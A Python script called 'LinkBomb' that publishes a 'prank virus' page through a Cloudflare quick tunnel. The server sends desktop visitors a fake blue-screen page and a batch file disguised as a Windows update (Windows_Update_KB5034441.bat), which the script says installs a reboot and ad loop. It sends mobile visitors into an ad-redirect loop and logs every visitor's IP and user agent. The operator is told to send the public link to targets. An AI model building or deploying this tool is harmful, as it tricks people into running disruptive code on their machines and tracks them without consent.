#!/usr/bin/env python3
"""
LinkBomb - serve a prank "virus" landing page over a Cloudflare quick tunnel.

Desktop visitors get a fake BSOD and a .bat that installs a reboot/ad loop.
Mobile visitors get an ad wall with a redirect loop.

No third-party Python packages. Works on Windows 10/11, Kali Linux and Termux.
"""

from __future__ import annotations

import argparse
import os
import platform
import random
import re
import shutil
import socket
import stat
import subprocess
import sys
import time
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

ROOT = os.path.dirname(os.path.abspath(__file__))
STATIC = os.path.join(ROOT, "static")
PAYLOAD = os.path.join(ROOT, "payload")
BIN = os.path.join(ROOT, "bin")

BAT_NAME = "Windows_Update_KB5034441.bat"
REMOVE_NAME = "Remove_Virus.bat"

ADS = [
    "https://www.amazon.com/deals",
    "https://www.daraz.pk",
    "https://www.olx.com.pk",
    "https://www.flipkart.com",
    "https://www.aliexpress.com",
    "https://www.bing.com/search?q=best+laptop+deals",
    "https://www.bing.com/search?q=iphone+price+in+pakistan",
    "https://www.youtube.com/feed/trending",
]

MOBILE_UA = (
    "android", "iphone", "ipad", "ipod", "mobile",
    "opera mini", "iemobile", "windows phone", "blackberry",
)


# --------------------------------------------------------------------------
# cloudflared bootstrap
# --------------------------------------------------------------------------

def _asset_name() -> str | None:
    sysname = platform.system()
    machine = platform.machine().lower()

    if sysname == "Windows":
        if machine in ("amd64", "x86_64"):
            return "cloudflared-windows-amd64.exe"
        return "cloudflared-windows-386.exe"

    if sysname == "Linux":
        if machine in ("aarch64", "arm64"):
            return "cloudflared-linux-arm64"
        if machine in ("armv7l", "armv8l", "arm"):
            return "cloudflared-linux-arm"
        return "cloudflared-linux-amd64"

    return None


def ensure_cloudflared() -> str:
    found = shutil.which("cloudflared")
    if found:
        return found

    name = _asset_name()
    if name is None:
        sys.exit(
            "cloudflared not found and auto-download is unsupported on this OS.\n"
            "Install it manually: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/"
        )

    os.makedirs(BIN, exist_ok=True)
    target = os.path.join(BIN, "cloudflared.exe" if name.endswith(".exe") else "cloudflared")

    if not os.path.exists(target):
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/" + name
        print(f"[*] Downloading cloudflared ({name}) ...")
        try:
            urllib.request.urlretrieve(url, target)
        except Exception as exc:
            sys.exit(f"[!] cloudflared download failed: {exc}")

        if os.name != "nt":
            os.chmod(target, os.stat(target).st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)

    print("[*] cloudflared ready.")
    return target


def start_tunnel(port: int):
    cf = ensure_cloudflared()
    kwargs = {"stdout": subprocess.PIPE, "stderr": subprocess.STDOUT, "text": True, "bufsize": 1}
    if os.name == "nt":
        kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW

    proc = subprocess.Popen([cf, "tunnel", "--url", f"http://127.0.0.1:{port}", "--no-autoupdate"], **kwargs)

    url = None
    deadline = time.time() + 90
    while time.time() < deadline:
        line = proc.stdout.readline()
        if not line:
            if proc.poll() is not None:
                break
            continue
        match = re.search(r"https://[a-z0-9-]+\.trycloudflare\.com", line)
        if match:
            url = match.group(0)
            break

    return proc, url


# --------------------------------------------------------------------------
# HTTP layer
# --------------------------------------------------------------------------

class Handler(BaseHTTPRequestHandler):
    server_version = "LinkBomb/1.0"
    sys_version = ""

    def log_message(self, fmt, *args):
        pass

    def _send(self, code: int, body: bytes = b"", ctype: str = "text/plain; charset=utf-8", extra=None):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Cache-Control", "no-store")
        for key, value in (extra or {}).items():
            self.send_header(key, value)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _file(self, path: str, ctype: str):
        try:
            with open(path, "rb") as fh:
                self._send(200, fh.read(), ctype)
        except OSError:
            self._send(404, b"not found")

    def _attachment(self, path: str, filename: str):
        try:
            with open(path, "rb") as fh:
                raw = fh.read()
        except OSError:
            return self._send(404, b"not found")

        raw = raw.replace(b"\r\n", b"\n").replace(b"\n", b"\r\n")
        self._send(
            200,
            raw,
            "application/octet-stream",
            {"Content-Disposition": f'attachment; filename="{filename}"'},
        )

    def do_GET(self):
        path = self.path.split("?")[0]
        ua = self.headers.get("User-Agent", "")
        ip = self.headers.get("CF-Connecting-IP") or self.client_address[0]

        if path in ("/", "/index.html"):
            mobile = any(token in ua.lower() for token in MOBILE_UA)
            print(f"[+] {ip} -> {'MOBILE' if mobile else 'DESKTOP'} :: {ua[:70]}")
            page = "mobile.html" if mobile else "index.html"
            return self._file(os.path.join(STATIC, page), "text/html; charset=utf-8")

        if path == "/dl/win.bat":
            print(f"[+] {ip} -> download {BAT_NAME}")
            return self._attachment(os.path.join(PAYLOAD, "windows_crash.bat"), BAT_NAME)

        if path == "/dl/remove.bat":
            return self._attachment(os.path.join(PAYLOAD, "remove.bat"), REMOVE_NAME)

        if path == "/go":
            target = random.choice(ADS)
            print(f"[+] {ip} -> ad {target}")
            return self._send(302, b"", extra={"Location": target})

        if path == "/health":
            return self._send(200, b"ok")

        self._send(404, b"not found")


# --------------------------------------------------------------------------
# entry point
# --------------------------------------------------------------------------

def free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def main() -> None:
    parser = argparse.ArgumentParser(description="Serve the prank page over a Cloudflare quick tunnel.")
    parser.add_argument("--port", type=int, default=0, help="local port (0 = random)")
    parser.add_argument("--no-tunnel", action="store_true", help="skip cloudflared, local only")
    args = parser.parse_args()

    for folder in (STATIC, PAYLOAD):
        if not os.path.isdir(folder):
            sys.exit(f"[!] missing folder: {folder}")

    port = args.port or free_port()
    httpd = ThreadingHTTPServer(("0.0.0.0", port), Handler)

    import threading
    threading.Thread(target=httpd.serve_forever, daemon=True).start()

    print("=" * 62)
    print("  LinkBomb running")
    print(f"  Local: http://127.0.0.1:{port}")
    print("=" * 62)

    tunnel = None
    if not args.no_tunnel:
        print("[*] Opening Cloudflare tunnel (10-25s) ...")
        tunnel, url = start_tunnel(port)
        print("=" * 62)
        if url:
            print("  PUBLIC LINK ->", url)
            print("  Send this. Mobile = ad wall, desktop = reboot loop.")
        else:
            print("  [!] Tunnel URL not captured. Check cloudflared / internet.")
        print("=" * 62)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down ...")
    finally:
        if tunnel:
            tunnel.terminate()
        httpd.shutdown()


if __name__ == "__main__":
    main()
